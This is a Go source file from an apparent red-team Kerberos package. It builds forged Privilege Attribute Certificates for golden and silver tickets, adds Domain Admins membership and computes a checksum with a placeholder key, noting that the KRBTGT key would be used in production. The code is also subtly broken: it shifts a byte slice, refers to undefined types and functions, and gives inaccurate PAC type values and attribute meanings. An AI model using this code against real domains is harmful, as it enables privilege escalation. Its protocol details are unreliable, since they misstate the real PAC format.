// Package tickets implements PAC (Privilege Attribute Certificate) construction
// Essential for forging valid Kerberos tickets with group memberships and privileges
package tickets

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"time"

	"github.com/sirupsen/logrus"
	"cloudai-fusion/pkg/redteam/ad_kerberos/native/crypto"
	"cloudai-fusion/pkg/redteam/ad_kerberos/native/asn1"
)

// ============================================================================
// PAC Structure Definitions
// ============================================================================

const (
	PAC_TYPE_CERTIFICATE_INFO = 2
	PAC_TYPE_CREDENTIAL       = 3
	PAC_TYPE_RESOURCE_GROUP   = 10
	PAC_TYPE_PRIMARY          = 16
)

// PACHeader is the header of a Privileged Attribute Certificate
type PACHeader struct {
	Version     int
	PacType     int
	Length      uint32
	Checksum    []byte
}

// PAC contains complete Privilege Attribute Certificate
type PAC struct {
	Header        PACHeader
	Elements      []PACElement
	Checksum      []byte
	KeyCryptCount int // Number of encrypted elements
}

// PACElement represents an individual PAC element
type PACElement struct {
	PacType   int
	Data      []byte
	ExtraData []byte
}

// ============================================================================
// Primary Account Information (PAI) Builder
// ============================================================================

// PAI contains primary account information including SID
type PAI struct {
	Signature      [8]byte
	Version          byte
	UserSid        []byte
	GroupSid       []uint32
	CredentialCount int
	ExFlags        uint32
	LogonServer    string
	DatabaseName   string
	LogonId        [8]byte
	RID            uint32
	Unknown4       [2]byte
	UAS            [32]byte
}

func NewPAI(userSid []byte, groups []string) *PAI {
	return &PAI{
		UserSid:   userSid,
		GroupSid:  make([]uint32, len(groups)),
		CredentialCount: len(groups),
		ExFlags:   0,
		LogonServer: "DOMAIN",
		DatabaseName: "DC",
	}
}

// EncodePAI encodes Primary Account Information
func (pai *PAI) Encode() ([]byte, error) {
	buffer := bytes.NewBuffer(make([]byte, 0, 512))
	
	// Signature
	copy(pai.Signature[:], []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	
	// Version
	buffer.WriteByte(0x01) // Current version
	
	// User Sid length + data
	userSidLen := uint32(len(pai.UserSid))
	binary.Write(buffer, binary.LittleEndian, userSidLen)
	buffer.Write(pai.UserSid)
	
	// Group count
	groupCount := uint32(len(pai.GroupSid))
	binary.Write(buffer, binary.LittleEndian, groupCount)
	
	// Group SIDs
	for _, sid := range pai.GroupSid {
		binary.Write(buffer, binary.LittleEndian, sid)
	}
	
	// Credential count
	binary.Write(buffer, binary.LittleEndian, uint32(pai.CredentialCount))
	
	// ExFlags
	binary.Write(buffer, binary.LittleEndian, pai.ExFlags)
	
	// Logon Server
	logonBytes := asn1.EncodeUTF8String(pai.LogonServer)
	binary.Write(buffer, binary.LittleEndian, uint32(len(logonBytes)))
	buffer.Write(logonBytes)
	
	// Database Name
	dbBytes := asn1.EncodeUTF8String(pai.DatabaseName)
	binary.Write(buffer, binary.LittleEndian, uint32(len(dbBytes)))
	buffer.Write(dbBytes)
	
	return buffer.Bytes(), nil
}

// ============================================================================
// Resource Group Builder
// ============================================================================

// ResourceGroup represents a group in a specific resource domain
type ResourceGroup struct {
	DomainSid []byte
	Name      string
	Sid       uint32
	Attributes uint32
}

// EncodeResourceGroups encodes multiple resource groups
func EncodeResourceGroups(groups []ResourceGroup) []byte {
	if len(groups) == 0 {
		return nil
	}
	
	enc := asn1.NewEncoder()
	seq := &asn1.BERElement{
		Tag:   asn1.TypeConstructed | asn1.TypeUniversal,
		Class: asn1.TypeUniversal,
	}
	
	for _, grp := range groups {
		elemSeq := &asn1.BERElement{
			Tag:   asn1.TypeConstructed | asn1.TypeUniversal,
			Class: asn1.TypeUniversal,
		}
		
		// Domain SID
		domainSID := grp.DomainSid
		elemSeq.Elements = append(elemSeq.Elements, &asn1.BERElement{
			Tag:   asn1.TypeOCTETSTRING,
			Class: asn1.TypeUniversal,
			Value: domainSID,
		})
		
		// Resource name (UPN format)
		nameBytes := asn1.EncodeUTF8String(grp.Name)
		elemSeq.Elements = append(elemSeq.Elements, &asn1.BERElement{
			Tag:   asn1.TypeUTF8String,
			Class: asn1.TypeUniversal,
			Value: nameBytes,
		})
		
		// SID
		sidBytes := asn1.EncodeInteger(int64(grp.Sid))
		elemSeq.Elements = append(elemSeq.Elements, &asn1.BERElement{
			Tag:   asn1.TypeUniversal | asn1.TypePrimitive,
			Class: asn1.TypeUniversal,
			Value: sidBytes,
		})
		
		// Attributes
		attrBytes := asn1.EncodeInteger(int64(grp.Attributes))
		elemSeq.Elements = append(elemSeq.Elements, &asn1.BERElement{
			Tag:   asn1.TypeUniversal | asn1.TypePrimitive,
			Class: asn1.TypeUniversal,
			Value: attrBytes,
		})
		
		seq.Elements = append(seq.Elements, elemSeq)
	}
	
	enc.Encode(seq)
	buf, _ := enc.GetBuffer()
	return buf
}

// ============================================================================
// PAC Builder
// ============================================================================

// PACBuilder constructs complete PAC structures for golden/silver tickets
type PACBuilder struct {
	logger         *logrus.Logger
	pai            *PAI
	resourceGroups []ResourceGroup
	customClaims   []CredentialClaim
}

// NewPACBuilder creates a new PAC builder
func NewPACBuilder(logger *logrus.Logger) *PACBuilder {
	if logger == nil {
		logger = logrus.New()
	}
	
	return &PACBuilder{
		logger:         logger.WithField("component", "pac_builder"),
		pai:            &PAI{},
		resourceGroups: make([]ResourceGroup, 0),
		customClaims:   make([]CredentialClaim, 0),
	}
}

// SetPrimaryAccount sets up the primary account SID
func (pb *PACBuilder) SetPrimaryAccount(userSid []byte, primaryRid uint32) {
	pb.pai = NewPAI(userSid, []string{"Domain Admins"})
	pb.pai.RID = primaryRid
	
	// Add default group membership (Domain Users RID 513)
	pb.pai.GroupSid = append(pb.pai.GroupSid, 513)
}

// AddDomainAdminGroup adds Domain Admin group (RID 512)
func (pb *PACBuilder) AddDomainAdminGroup(domainSid []byte) {
	// Add to PAI
	pb.pai.GroupSid = append(pb.pai.GroupSid, 512)
	
	// Add as resource group
	pb.resourceGroups = append(pb.resourceGroups, ResourceGroup{
		DomainSid: domainSid,
		Name:      "domain admins",
		Sid:       512,
		Attributes: 0x20000000, // SecTrustedToAuthForDelegation
	})
	
	pb.logger.Info("Added Domain Admin group membership")
}

// AddServiceTicketPermissions grants service-specific access
func (pb *PACBuilder) AddServiceTicketPermissions(service string, permissions []string) {
	// Service SID would be constructed from SPN
	// Simplified here
	
	pb.customClaims = append(pb.customClaims, CredentialClaim{
		Name:  "service",
		Value: service,
		Attr:  uint32(len(permissions)),
	})
}

// Build creates the final PAC structure
func (pb *PACBuilder) Build() (*PAC, error) {
	pb.logger.Info("Building PAC structure...")
	
	pac := &PAC{
		Header: PACHeader{
			Version:  0x1,
			PacType:  0x1, // PAC_LOGON_INFO
			Length:   0,
			Checksum: make([]byte, 0),
		},
		Elements: make([]PACElement, 0),
	}
	
	// Encode PAI (Primary Account Information)
	paiBytes, err := pb.pai.Encode()
	if err != nil {
		return nil, fmt.Errorf("failed to encode PAI: %w", err)
	}
	
	pac.Elements = append(pac.Elements, PACElement{
		PacType: PAC_TYPE_PRIMARY,
		Data:    paiBytes,
	})
	
	// Encode resource groups
	if len(pb.resourceGroups) > 0 {
		resourceBytes := EncodeResourceGroups(pb.resourceGroups)
		pac.Elements = append(pac.Elements, PACElement{
			PacType: PAC_TYPE_RESOURCE_GROUP,
			Data:    resourceBytes,
		})
	}
	
	// Add custom claims if any
	if len(pb.customClaims) > 0 {
		claimBytes := EncodeCredentialClaims(pb.customClaims)
		pac.Elements = append(pac.Elements, PACElement{
			PacType: PAC_TYPE_CREDENTIAL,
			Data:    claimBytes,
		})
	}
	
	// Calculate PAC checksum
	pac.Checksum = calculatePACChecksum(pac)
	pb.logger.Info("PAC built successfully")
	
	return pac, nil
}

// calculatePACChecksum computes HMAC-SHA1 over PAC body
func calculatePACChecksum(pac *PAC) []byte {
	// Combine all elements without checksum field
	var buf bytes.Buffer
	
	for _, elem := range pac.Elements {
		buf.Write([]byte{byte(elem.PacType >> 24), byte(elem.PacType >> 16), byte(elem.PacType >> 8), byte(elem.PacType)})
		buf.Write([]byte{byte(elem.Data >> 24), byte(elem.Data >> 16), byte(elem.Data >> 8), byte(elem.Data)})
		buf.Write(elem.Data)
	}
	
	// Create dummy key for demo (would use KRBTGT key in production)
	key := []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F}
	
	hmac, _ := crypto.NewHMACSHA1(key)
	checksum, _ := hmac.Sign(buf.Bytes())
	
	return checksum[:16]
}
